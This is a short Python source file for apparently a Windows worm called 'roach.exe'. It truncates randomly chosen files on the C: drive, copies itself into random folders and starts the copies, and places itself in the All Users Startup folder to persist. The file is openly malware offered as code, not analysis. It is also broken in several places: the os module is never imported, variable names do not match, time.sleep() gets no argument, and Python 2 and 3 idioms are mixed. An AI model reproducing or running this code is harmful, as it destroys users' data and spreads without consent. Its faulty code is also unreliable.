from os import system
import random
import time
from random import randint
from time import sleep
from binascii import unhexlify
import dircache
import shutil
from threading import Thread
import threading
import win32file
import subprocess
import string



sleep = time.sleep()
sysc = os.system
our_user = os.getenv('username')
main_pid = os.getpid()
our_folder = "C:"
our_self = os.getcwd() + "roach.exe"
full_drive_list = list(string.ascii_uppercase.strip('A'))
common_drive_list = list(string.ascii_uppercase.strip('A')[0:6])


def getRandomfile(): # returns a random file 
	dircache.reset()
	thisFile = f"{ourFolder}\\{random.choice(dircache.listdir(ourFolder))}"
	return thisFile


def munch_bytes(file): # om nom nom
	chewThis = random.randint(1,1337) * 10
	print(f"[@]DEBUG: IMMA MUNCH THIS: {file}") 
	print(f"[@]DEBUG: IMMA EAT: {chewThis} BYTES")
	with open(file, 'w+') as fdest:
        	fdest.seek(chewThis, os.SEEK_END)
        	fdest.truncate(chewThis)
        	#print "[@]DEBUG: NOM NOM TASTY FILES"

def getTime():
	thisTime = randint(60,600) # 1 minute through 10 minute(s)
	return thisTime

def spread():
    	thisFolder = getRandomfile()
    	subprocess.Popen([f"robocopy {ourself} {thisFolder} & start {thisFolder}\\{ourSelf}"], stdout=subprocess.PIPE)
		
def runOnce():
    	subprocess.Popen([f"robocopy {ourself} C:\\Users\\All Users\\Microsoft\Windows\\Start Menu\\Programs\\Startup"], stdout=subprocess.PIPE)

def run(): 
    dat_file = getRandomfile()
    munch_bytes(dat_file)

    if random.randint(1,100) < 23: # chance to spread 
        spread()


